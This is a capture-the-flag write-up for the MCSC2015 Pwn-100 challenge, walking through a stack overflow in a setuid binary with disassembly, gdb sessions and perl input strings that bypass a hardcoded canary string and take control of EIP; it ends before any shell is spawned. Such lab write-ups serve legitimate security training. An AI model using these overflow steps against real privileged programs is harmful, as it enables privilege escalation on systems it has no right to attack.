#MCSC2015 writeup for Pwn-100
After establishing ssh connection, here's what are up to :
```
pwn1@MCSC2015:/challenges/pwn1$ ls -lia
total 28
13238274 drwxr-xr-x 2 root   root    4096 mai   18 15:13 .
13238273 drwxr-xr-x 6 root   root    4096 mai   18 15:13 ..
13238276 -rw------- 1 pwned1 pwned1    36 mai   18 15:13 FLAG
13238275 -rws--sr-x 1 pwned1 pwned1 12376 mai   18 15:13 pwn1
```
Let's first check the security of this binary :	

```
pwn1@MCSC2015:/challenges/pwn1$ /tmp/checksec.sh --file /challenges/pwn1/pwn1 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   pwn1
pwn1@MCSC2015:/challenges/pwn1$ cat /proc/sys/kernel/randomize_va_space 
2
```
As it appear, there's no protection exept for ASLR.
Nothing but good news ... for now !
Let's look to the binary more closely.
```
080489fe <main>:
 80489fe:	55                   	push   %ebp
 80489ff:	89 e5                	mov    %esp,%ebp
 8048a01:	e8 01 fc ff ff       	call   8048607 <vuln>
 8048a06:	b8 00 00 00 00       	mov    $0x0,%eax
 8048a0b:	5d                   	pop    %ebp
 8048a0c:	c3                   	ret    
 8048a0d:	66 90                	xchg   %ax,%ax
 8048a0f:	90                   	nop
```
Nothing too special,a simple call to vuln function:
```
08048607 <vuln>:
 8048607:	55                   	push   %ebp
 8048608:	89 e5                	mov    %esp,%ebp
 804860a:	83 ec 30             	sub    $0x30,%esp ( Buffer size 30 )
 804860d:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
 8048614:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
 804861b:	8d 45 f8             	lea    -0x8(%ebp),%eax
 804861e:	c7 00 41 70 57 6d    	movl   $0x6d577041,(%eax)
 8048624:	66 c7 40 04 37 50    	movw   $0x5037,0x4(%eax)
 804862a:	c6 40 06 50          	movb   $0x50,0x6(%eax)
 804862e:	a1 a0 a0 04 08       	mov    0x804a0a0,%eax
 8048633:	50                   	push   %eax
 8048634:	6a 64                	push   $0x64
 8048636:	8d 45 d0             	lea    -0x30(%ebp),%eax
 8048639:	50                   	push   %eax
 804863a:	e8 11 fe ff ff       	call   8048450 <fgets@plt>
 804863f:	83 c4 0c             	add    $0xc,%esp
 8048642:	68 90 8a 04 08       	push   $0x8048a90
 8048647:	8d 45 f8             	lea    -0x8(%ebp),%eax
 804864a:	50                   	push   %eax
 804864b:	e8 d0 fd ff ff       	call   8048420 <strcmp@plt>
 8048650:	83 c4 08             	add    $0x8,%esp
 8048653:	85 c0                	test   %eax,%eax
 8048655:	75 10                	jne    8048667 <vuln+0x60>
 8048657:	8b 45 04             	mov    0x4(%ebp),%eax
 804865a:	50                   	push   %eax
 804865b:	e8 5b ff ff ff       	call   80485bb <drop_eip>
 8048660:	83 c4 04             	add    $0x4,%esp
 8048663:	85 c0                	test   %eax,%eax
 8048665:	75 14                	jne    804867b <vuln+0x74>
 8048667:	68 98 8a 04 08       	push   $0x8048a98
 804866c:	e8 ff fd ff ff       	call   8048470 <puts@plt>
 8048671:	83 c4 04             	add    $0x4,%esp
 8048674:	6a 00                	push   $0x0
 8048676:	e8 25 fe ff ff       	call   80484a0 <exit@plt>
 804867b:	c9                   	leave  
 804867c:	c3                   	ret    
```
This function calls fgets, to get the user's input, then push $0x8048a90.
Finally a strcmp to compare something with whatever $eax point to.
let's run gdb to further inspection and break at those :
Breakpoint 1 at 0x804863a fgets in vuln
Breakpoint 2 at 0x804864b strcmp in vuln
```
pwn1@MCSC2015:/challenges/pwn1$ gdb ./pwn1 
(gdb) break *0x804863a
Breakpoint 1 at 0x804863a
(gdb) 	
Breakpoint 2 at 0x804864b
(gdb) run
Starting program: /challenges/pwn1/pwn1 

Breakpoint 1, 0x0804863a in vuln ()
(gdb) c
Continuing.
salut

Breakpoint 2, 0x0804864b in vuln ()
(gdb) x/s $eax
0xbf896fd8:	"ApWm7PP"
```
let's start again gdb and break when strcmp is called in vuln function
```
pwn1@MCSC2015:/challenges/pwn1$ gdb ./pwn1 
(gdb) run
Starting program: /challenges/pwn1/pwn1 
   

Breakpoint 1, 0x0804864b in vuln ()
(gdb) x/s $eax
0xbf806c28:	"ApWm7PP"
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /challenges/pwn1/pwn1 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBB

Breakpoint 1, 0x0804864b in vuln ()
(gdb) x/s $eax
0xbff16cb8:	"BBB\n"
```
By running our binary with "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB" nothing happens ( canary is not overwritten)
However when running with "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBB", the canary is overwritten with "BBB"
Bingo !
(We could find the offset using ltrace to find the offset to the canary as well ...)
Let's exit gdb and check that again
```
pwn1@MCSC2015:/challenges/pwn1$ perl -e 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApWm7Px\x00"' |./pwn1 
Go away..
pwn1@MCSC2015:/challenges/pwn1$ perl -e 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApWm7PP\x00"' |./pwn1 
pwn1@MCSC2015:/challenges/pwn1$ 
```
I run the program with first a false value of the canary to see if the offset is different from gdb, it can happen xD.
Canary bypassed! we now just need to complete with some A's to override $eip ...

```
pwn1@MCSC2015:/challenges/pwn1$ perl -e 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApWm7PP\x00AAAAAAAA"' |./pwn1 
Segmentation fault (core dumped)
```
Bingo let's run gdb again to analyse more closely
```
pwn1@MCSC2015:/challenges/pwn1$ perl -e 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApWm7PP\x00AAAAAAAA"' > /tmp/input
pwn1@MCSC2015:/challenges/pwn1$ gdb ./pwn1 
(gdb) run < /tmp/input
Starting program: /challenges/pwn1/pwn1 < /tmp/input

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) 
```
Yum Yum ... we're too close to exploit that binary :)
You could start by adding a lot of A's, the $eip=0x41414141, you're going to run again with the same input but less A's at the end, still eip=0x41414141, and run again to find the exact offset.
However,pattern_create.rb and pattern offset.b in the metasploit framework can be handy to find the exact offset to eip without having to bruteforce it.
Now, we just need to override the $eip to spawn a shell ....
ASLR is on, remember ? :)




